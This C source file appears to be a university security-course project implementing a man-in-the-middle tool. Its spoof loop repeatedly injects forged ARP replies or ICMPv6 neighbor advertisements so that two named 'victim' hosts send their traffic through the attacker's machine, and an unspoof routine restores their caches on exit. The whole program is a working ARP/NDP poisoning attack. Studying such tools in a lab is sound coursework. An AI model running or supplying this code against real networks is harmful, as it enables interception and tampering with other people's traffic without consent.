//VUTBR - FIT - PDS project MitM
//Author: Jan Kubis / xkubis13
#include <signal.h>
#include <ctype.h>

#include "pdslib/pds_addr.h"
#include "pdslib/pds_pkt.h"

typedef struct {
	char* ifName;
	int interval_ms;
	char* protocol;
	mac_t vic1_mac;
	ipv4_t vic1_ipv4;
	ipv6_t vic1_ipv6;
	mac_t vic2_mac;
	ipv4_t vic2_ipv4;
	ipv6_t vic2_ipv6;
} clargs_t;

#define ARG_IPV4_TYPE 1
#define ARG_IPV6_TYPE 2
int arg_ip_type = 0;


volatile bool sigint_recv = false;
void sigint_callback(int signo){
	UNUSED(signo);
	sigint_recv = true;
	printf("SIGINT received, wait to finish..\n");
}

int parseArgs(int argc, char* argv[], clargs_t *clargs){
	
	if(argc!=15){return 1;}


	for(int i=1;i<argc;i++){
		if(strcmp(argv[i],"-i")==0){
			if(argv[i++]==NULL){return 1;} //move to arg value && check value missing
			clargs->ifName=argv[i];
		}
		else if(strcmp(argv[i],"-t")==0){
			if(argv[i++]==NULL){return 1;} //move to arg value && check value missing
			if(!isdigit(*argv[i])){;return 1;} //ms integer
			clargs->interval_ms=strtol(argv[i],NULL,10);
		}
		else if(strcmp(argv[i],"-p")==0){
			if(argv[i++]==NULL){return 1;} //move to arg value && check value missing
			if(strcmp(argv[i],"arp")!=0 && strcmp(argv[i],"ndp")!=0){printf("ee");return 1;} // arp || ndp only
			clargs->protocol=argv[i];
		}
		else if(strcmp(argv[i],"-victim1ip")==0){
			if(argv[i++]==NULL){return 1;} //move to arg value && check value missing
			//todo: check address
			if(argv[i][3]=='.'){ //ipv4
				if(arg_ip_type==ARG_IPV6_TYPE){return 1;}
				ptoipv4t(argv[i],clargs->vic1_ipv4);
				arg_ip_type=ARG_IPV4_TYPE;
			}
			else{ //ipv6
				if(arg_ip_type==ARG_IPV4_TYPE){return 1;}
				ptoipv6t(argv[i],clargs->vic1_ipv6);
				arg_ip_type=ARG_IPV6_TYPE;
			}
		}
		else if(strcmp(argv[i],"-victim1mac")==0){
			if(argv[i++]==NULL){return 1;} //move to arg value && check value missing
			//todo: check address
			ptomact(argv[i],clargs->vic1_mac);
		}
		else if(strcmp(argv[i],"-victim2ip")==0){
			if(argv[i++]==NULL){return 1;} //move to arg value && check value missing
			//todo: check address
			if(argv[i][3]=='.'){ //ipv4
				if(arg_ip_type==ARG_IPV6_TYPE){return 1;}
				ptoipv4t(argv[i],clargs->vic2_ipv4);
				arg_ip_type=ARG_IPV4_TYPE;
			}
			else{ //ipv6
				if(arg_ip_type==ARG_IPV4_TYPE){return 1;}
				ptoipv6t(argv[i],clargs->vic2_ipv6);
				arg_ip_type=ARG_IPV6_TYPE;
			}
		}
		else if(strcmp(argv[i],"-victim2mac")==0){
			if(argv[i++]==NULL){return 1;} //move to arg value && check value missing
			//todo: check address
			ptomact(argv[i],clargs->vic2_mac);
		}
		else{
			return 1;
		}
	}

	if(strcmp(clargs->protocol,"arp")==0 && arg_ip_type==ARG_IPV6_TYPE){
		return 1;
	}
	else if(strcmp(clargs->protocol,"ndp")==0 && arg_ip_type==ARG_IPV4_TYPE){
		return 1;
	}

	return 0;
}

void spoof(iface_t iface, clargs_t clargs){
	
	while(!sigint_recv){
		if(arg_ip_type==ARG_IPV4_TYPE){ //IPV4
			uint8_t pkt1[PKT_ARP_LEN];
			arp_pkt_build(pkt1,clargs.vic2_ipv4,clargs.vic1_ipv4,iface.mac,clargs.vic1_mac,ARP_OP_REPLY);
			uint8_t pkt2[PKT_ARP_LEN];
			arp_pkt_build(pkt2,clargs.vic1_ipv4,clargs.vic2_ipv4,iface.mac,clargs.vic2_mac,ARP_OP_REPLY);
			pcap_inject(iface.handle, pkt1, PKT_ARP_LEN);
			pcap_inject(iface.handle, pkt2, PKT_ARP_LEN);
			
		}
		else{ //IPV6
			uint8_t pkt1[PKT_ICMPV6_ADVERT_LEN];
			icmpv6_pkt_advert_build(pkt1,iface.mac,clargs.vic1_ipv6,clargs.vic2_mac,clargs.vic2_ipv6);
			uint8_t pkt2[PKT_ICMPV6_ADVERT_LEN];
			icmpv6_pkt_advert_build(pkt2,iface.mac,clargs.vic2_ipv6,clargs.vic1_mac,clargs.vic1_ipv6);
			pcap_inject(iface.handle,pkt1,PKT_ICMPV6_ADVERT_LEN);
			pcap_inject(iface.handle,pkt2,PKT_ICMPV6_ADVERT_LEN);
		}

		usleep(clargs.interval_ms*1000);
	}

	return;
}

void unspoof(iface_t iface, clargs_t clargs){
	if(arg_ip_type==ARG_IPV4_TYPE){ //IPV4
		uint8_t pkt1[PKT_ARP_LEN];
		arp_pkt_build(pkt1,clargs.vic2_ipv4,clargs.vic1_ipv4,clargs.vic2_mac,clargs.vic1_mac,ARP_OP_REPLY);
		uint8_t pkt2[PKT_ARP_LEN];
		arp_pkt_build(pkt2,clargs.vic1_ipv4,clargs.vic2_ipv4,clargs.vic1_mac,clargs.vic2_mac,ARP_OP_REPLY);
		//src mac in eth header is real physical mac
		ethhdr_t* h1 = (ethhdr_t*)pkt1;
		ethhdr_t* h2 = (ethhdr_t*)pkt2;
		memcpy(h1->src_mac,iface.mac,MAC_LEN);
		memcpy(h2->src_mac,iface.mac,MAC_LEN);
		//------------------------------------------
		pcap_inject(iface.handle, pkt1, PKT_ARP_LEN);
		pcap_inject(iface.handle, pkt2, PKT_ARP_LEN);
	}
	else{ //IPV6
		uint8_t pkt1[PKT_ICMPV6_ADVERT_LEN];
		icmpv6_pkt_advert_build(pkt1,clargs.vic1_mac,clargs.vic1_ipv6,clargs.vic2_mac,clargs.vic2_ipv6);
		uint8_t pkt2[PKT_ICMPV6_ADVERT_LEN];
		icmpv6_pkt_advert_build(pkt2,clargs.vic2_mac,clargs.vic2_ipv6,clargs.vic1_mac,clargs.vic1_ipv6);
		//src mac in eth header is real physical mac
		ethhdr_t* h1 = (ethhdr_t*)pkt1;
		ethhdr_t* h2 = (ethhdr_t*)pkt2;
		memcpy(h1->src_mac,iface.mac,MAC_LEN);
		memcpy(h2->src_mac,iface.mac,MAC_LEN);
		//------------------------------------------
		pcap_inject(iface.handle,pkt1,PKT_ICMPV6_ADVERT_LEN);
		pcap_inject(iface.handle,pkt2,PKT_ICMPV6_ADVERT_LEN);
	}
}

int main(int argc, char* argv[]){
	
	clargs_t clargs;
	iface_t iface;
	signal(SIGINT, sigint_callback);
	
	if((parseArgs(argc,argv,&clargs))!=0){
		return 0;
	}

	char errbuf[PCAP_ERRBUF_SIZE];
	if ((iface.handle=pcap_create(clargs.ifName,errbuf))==NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", clargs.ifName, errbuf);
		return 0;
	}
	iface.name=clargs.ifName;
	get_if_addrs(clargs.ifName,&iface);
	pcap_activate(iface.handle);

	spoof(iface,clargs);
	sleep(1); //wait befor unspoof, otherwise it might not work
	unspoof(iface,clargs);

	pcap_close(iface.handle);
}